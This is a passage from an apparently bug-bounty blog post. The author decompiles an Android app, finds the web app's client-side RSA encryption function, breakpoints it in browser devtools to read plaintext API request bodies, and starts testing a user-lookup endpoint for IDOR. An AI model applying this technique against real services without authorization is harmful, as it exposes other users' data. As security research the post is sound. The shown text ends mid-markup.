called functions), I figured out how a couple of functions work but it wasn&#x27;t helpful to my goal (finding where the encryption/decryption is done).</p><p id="0025" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I needed any word or function name to search for in this js file to speed up the reversing process, so I tried to find the old version of this file in the internet archive maybe it wasn’t obfuscated, but no luck.</p></div></div></div><div class="ab cb pc pd pe pf" role="separator"><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi pj"></span><span class="pg by bm ph pi"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="6026" class="nf ng gu bf nh ni nj dy nk nl nm ea nn ms no np nq mw nr ns nt na nu nv nw nx bk">Who else is using the same API?</h2><p id="49b1" class="pw-post-body-paragraph mh mi gu mj b mk ny mm mn mo nz mq mr ms oa mu mv mw ob my mz na oc nc nd ne gn bk">The <strong class="mj gv">android application</strong>! I thought that I can decompile their android application and get its <strong class="mj gv">resources</strong>, and try to find if they are using the same encryption/decryption implementation or if this file is obfuscated or not! let’s try</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*CHuJxG5FrQPiFA3gIgE_zQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*CHuJxG5FrQPiFA3gIgE_zQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*CHuJxG5FrQPiFA3gIgE_zQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*CHuJxG5FrQPiFA3gIgE_zQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*CHuJxG5FrQPiFA3gIgE_zQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*CHuJxG5FrQPiFA3gIgE_zQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CHuJxG5FrQPiFA3gIgE_zQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*CHuJxG5FrQPiFA3gIgE_zQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*CHuJxG5FrQPiFA3gIgE_zQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*CHuJxG5FrQPiFA3gIgE_zQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*CHuJxG5FrQPiFA3gIgE_zQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*CHuJxG5FrQPiFA3gIgE_zQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*CHuJxG5FrQPiFA3gIgE_zQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*CHuJxG5FrQPiFA3gIgE_zQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="246" loading="eager" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">decompiling the APK</figcaption></figure><p id="2b7c" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I decompiled the APK with <a class="af pl" href="https://ibotpeaches.github.io/Apktool/" rel="noopener ugc nofollow" target="_blank">apktool</a> and then started to search for the same word -“<strong class="mj gv">pef2</strong>”- inside the whole application files.</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pm"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*TDd5BQonUaCJLPFjL0ae_A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*TDd5BQonUaCJLPFjL0ae_A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*TDd5BQonUaCJLPFjL0ae_A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*TDd5BQonUaCJLPFjL0ae_A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*TDd5BQonUaCJLPFjL0ae_A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*TDd5BQonUaCJLPFjL0ae_A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TDd5BQonUaCJLPFjL0ae_A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*TDd5BQonUaCJLPFjL0ae_A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*TDd5BQonUaCJLPFjL0ae_A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*TDd5BQonUaCJLPFjL0ae_A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*TDd5BQonUaCJLPFjL0ae_A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*TDd5BQonUaCJLPFjL0ae_A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*TDd5BQonUaCJLPFjL0ae_A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*TDd5BQonUaCJLPFjL0ae_A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="234" loading="lazy" role="presentation"/></picture></div></div></figure><p id="bc2d" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I found a new js file called “<strong class="mj gv">index.android.bundle</strong>” containing this word, after opening this file with a js-beautifier tool, and thankfully it <strong class="mj gv">was not obfuscated</strong>!</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pn"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*VrR4vHVpJeO9ACPtN3WLqw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*VrR4vHVpJeO9ACPtN3WLqw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*VrR4vHVpJeO9ACPtN3WLqw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*VrR4vHVpJeO9ACPtN3WLqw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*VrR4vHVpJeO9ACPtN3WLqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*VrR4vHVpJeO9ACPtN3WLqw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VrR4vHVpJeO9ACPtN3WLqw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*VrR4vHVpJeO9ACPtN3WLqw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*VrR4vHVpJeO9ACPtN3WLqw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*VrR4vHVpJeO9ACPtN3WLqw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*VrR4vHVpJeO9ACPtN3WLqw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*VrR4vHVpJeO9ACPtN3WLqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*VrR4vHVpJeO9ACPtN3WLqw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*VrR4vHVpJeO9ACPtN3WLqw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="384" loading="lazy" role="presentation"/></picture></div></div></figure><p id="23d0" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As you can see, “<strong class="mj gv">pef2</strong>” is mentioned in line <strong class="mj gv">106568</strong>, and this string is mentioned in a function called “<strong class="mj gv">encrypt”</strong>.</p><p id="f638" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">We can use some words mentioned in this function and search for them in the JS file on the web application, just to focus more on our main target which is the web application.</p><p id="42f4" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I searched for new words like <code class="cx ow ox oy oz b"><strong class="mj gv">getBytesSync</strong></code><strong class="mj gv">, </strong><code class="cx ow ox oy oz b"><strong class="mj gv">RSA-OAEP</strong></code><strong class="mj gv"> , </strong>and of course<strong class="mj gv"> </strong><code class="cx ow ox oy oz b"><strong class="mj gv">encrypt</strong></code><strong class="mj gv"> .</strong></p><h2 id="0f6f" class="nf ng gu bf nh ni nj dy nk nl nm ea nn ms no np nq mw nr ns nt na nu nv nw nx bk">Back to the main goal — Second Round:</h2><p id="3fda" class="pw-post-body-paragraph mh mi gu mj b mk ny mm mn mo nz mq mr ms oa mu mv mw ob my mz na oc nc nd ne gn bk">I opened the <strong class="mj gv">Sources </strong>window in <strong class="mj gv">dev tools</strong> and searched for <code class="cx ow ox oy oz b"><strong class="mj gv">getBytesSync</strong></code> and found some results, but because the file was minimized, I used the <strong class="mj gv">pretty print </strong>feature in the browser to make it more readable.</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe po"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wXYihEII8FQdVVcFoi3tiw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*wXYihEII8FQdVVcFoi3tiw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*wXYihEII8FQdVVcFoi3tiw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*wXYihEII8FQdVVcFoi3tiw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*wXYihEII8FQdVVcFoi3tiw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*wXYihEII8FQdVVcFoi3tiw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wXYihEII8FQdVVcFoi3tiw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*wXYihEII8FQdVVcFoi3tiw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*wXYihEII8FQdVVcFoi3tiw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*wXYihEII8FQdVVcFoi3tiw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*wXYihEII8FQdVVcFoi3tiw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*wXYihEII8FQdVVcFoi3tiw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*wXYihEII8FQdVVcFoi3tiw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*wXYihEII8FQdVVcFoi3tiw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="723" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">making the code more readable</figcaption></figure><p id="bb77" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I ended up with a function called “<strong class="mj gv">encrypt” </strong>in line <strong class="mj gv">137777, </strong>and as<strong class="mj gv"> </strong>you can see above, this function takes 2 arguments, let’s add a breakpoint to pause the JS execution and inspect this function and check what is going on.</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*4ni_4F1kHrGZM31WvLIFOQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*4ni_4F1kHrGZM31WvLIFOQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*4ni_4F1kHrGZM31WvLIFOQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*4ni_4F1kHrGZM31WvLIFOQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*4ni_4F1kHrGZM31WvLIFOQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*4ni_4F1kHrGZM31WvLIFOQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4ni_4F1kHrGZM31WvLIFOQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*4ni_4F1kHrGZM31WvLIFOQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*4ni_4F1kHrGZM31WvLIFOQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*4ni_4F1kHrGZM31WvLIFOQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*4ni_4F1kHrGZM31WvLIFOQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*4ni_4F1kHrGZM31WvLIFOQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*4ni_4F1kHrGZM31WvLIFOQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*4ni_4F1kHrGZM31WvLIFOQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="244" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">Adding breakpoints</figcaption></figure><p id="597a" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">After initiating a random request to invoke the breakpoint, I found the following</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*5_GmYYW8SHBTcaFLure-ow.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*5_GmYYW8SHBTcaFLure-ow.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*5_GmYYW8SHBTcaFLure-ow.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*5_GmYYW8SHBTcaFLure-ow.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*5_GmYYW8SHBTcaFLure-ow.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*5_GmYYW8SHBTcaFLure-ow.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5_GmYYW8SHBTcaFLure-ow.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*5_GmYYW8SHBTcaFLure-ow.png 640w, https://miro.medium.com/v2/resize:fit:720/1*5_GmYYW8SHBTcaFLure-ow.png 720w, https://miro.medium.com/v2/resize:fit:750/1*5_GmYYW8SHBTcaFLure-ow.png 750w, https://miro.medium.com/v2/resize:fit:786/1*5_GmYYW8SHBTcaFLure-ow.png 786w, https://miro.medium.com/v2/resize:fit:828/1*5_GmYYW8SHBTcaFLure-ow.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*5_GmYYW8SHBTcaFLure-ow.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*5_GmYYW8SHBTcaFLure-ow.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="295" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">checking the DOM after invoking the breakpoint</figcaption></figure><p id="4487" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">One of the arguments of <strong class="mj gv">encrypt </strong>function is <strong class="mj gv">_0x3fc2ff</strong>, and its value as you can see in the <strong class="mj gv">Scope </strong>section is a JSON object, so let’s move to the <strong class="mj gv">console </strong>to fully understand its components.</p><p id="d230" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As the breakpoint is on, we can print and perform actions while the application paused.</p><h2 id="34b6" class="nf ng gu bf nh ni nj dy nk nl nm ea nn ms no np nq mw nr ns nt na nu nv nw nx bk">Analyzing the data passed to the “encrypt” function:</h2><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*KZudihMhdhgzboqQVN2_sw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*KZudihMhdhgzboqQVN2_sw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*KZudihMhdhgzboqQVN2_sw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*KZudihMhdhgzboqQVN2_sw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*KZudihMhdhgzboqQVN2_sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*KZudihMhdhgzboqQVN2_sw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KZudihMhdhgzboqQVN2_sw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*KZudihMhdhgzboqQVN2_sw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*KZudihMhdhgzboqQVN2_sw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*KZudihMhdhgzboqQVN2_sw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*KZudihMhdhgzboqQVN2_sw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*KZudihMhdhgzboqQVN2_sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*KZudihMhdhgzboqQVN2_sw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*KZudihMhdhgzboqQVN2_sw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="158" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">original request body</figcaption></figure><p id="3134" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">A JSON object contains multiple keys/values that the API uses to handle the requests, so this is the original request body before any type of encryption.</p><p id="f71e" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The request is sent to <code class="cx ow ox oy oz b"><strong class="mj gv">/v1/user</strong></code> API endpoint with two parameters <code class="cx ow ox oy oz b"><strong class="mj gv">domain</strong></code><strong class="mj gv"> </strong>and <code class="cx ow ox oy oz b"><strong class="mj gv">user</strong></code><strong class="mj gv"> </strong>,<strong class="mj gv"> </strong>and returns all information about this <strong class="mj gv">user </strong>as you can see below</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZJAaXWZ_wbFa46PfqVr4oA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZJAaXWZ_wbFa46PfqVr4oA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZJAaXWZ_wbFa46PfqVr4oA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZJAaXWZ_wbFa46PfqVr4oA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZJAaXWZ_wbFa46PfqVr4oA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZJAaXWZ_wbFa46PfqVr4oA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZJAaXWZ_wbFa46PfqVr4oA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ZJAaXWZ_wbFa46PfqVr4oA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZJAaXWZ_wbFa46PfqVr4oA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZJAaXWZ_wbFa46PfqVr4oA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZJAaXWZ_wbFa46PfqVr4oA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZJAaXWZ_wbFa46PfqVr4oA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZJAaXWZ_wbFa46PfqVr4oA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZJAaXWZ_wbFa46PfqVr4oA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="342" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">returned data from the request</figcaption></figure><p id="a912" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As you may guess, we can test for IDOR in the <code class="cx ow ox oy oz b"><strong class="mj gv">user</strong></code> parameter, let’s change it to another username and check the response!</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZezDoEUMPE0we-IUCaURsQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZezDoEUMPE0we-IUCaURsQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZezDoEUMPE0we-IUCaURsQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZezDoEUMPE0we-IUCaURsQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZezDoEUMPE0we-IUCaURsQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZezDoEUMPE0we-IUCaURsQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZezDoEUMPE0we-IUCaURsQ.png 1400w" 